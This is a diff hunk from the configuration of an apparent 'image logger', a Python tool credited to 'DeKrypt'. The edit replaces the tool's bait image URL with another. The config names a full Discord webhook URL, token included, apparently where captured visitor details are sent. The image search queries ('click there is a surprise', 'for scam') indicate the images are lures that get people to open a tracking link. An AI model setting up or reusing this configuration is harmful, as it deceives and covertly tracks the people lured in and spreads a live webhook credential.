@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1400226146460762313/d1zWVKQ_BXjbj7VGG7wR_tYmJQJTJXsIkSvBrfS1n0LADdQ3cFh3Q_yl6lFcQZSHIhQ-",
-    "image": "https://www.google.com/imgres?q=click%20there%20is%20a%20surprise&imgurl=https%3A%2F%2Fcard.birthdayalarm.com%2Fcards%2F230%2Fboom-2519.jpg&imgrefurl=https%3A%2F%2Fbirthdayalarm.com%2Fcard%2Fview%2F230&docid=Z41V6RGT7tfMIM&tbnid=3haRaZTpSwSRkM&vet=12ahUKEwjI7a7pl7iPAxU4UaQEHQ1GLIAQM3oECB8QAA..i&w=1280&h=720&hcb=2&ved=2ahUKEwjI7a7pl7iPAxU4UaQEHQ1GLIAQM3oECB8QAA", # You can also have a custom image by using a URL argument
+    "image": "https://www.google.com/imgres?q=garama%20in%20base%20for%20scam&imgurl=https%3A%2F%2Flookaside.fbsbx.com%2Flookaside%2Fcrawler%2Fmedia%2F%3Fmedia_id%3D122139609002741347&imgrefurl=https%3A%2F%2Fwww.facebook.com%2Fgroups%2FGISquared%2Fposts%2F10161836575797351%2F&docid=yqqhnmJzLIEkxM&tbnid=vcu65gYRQhJCLM&vet=12ahUKEwiR_KPnmriPAxVBUaQEHZ_nO2kQM3oECB8QAA..i&w=2400&h=1080&hcb=2&ved=2ahUKEwiR_KPnmriPAxVBUaQEHZ_nO2kQM3oECB8QAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
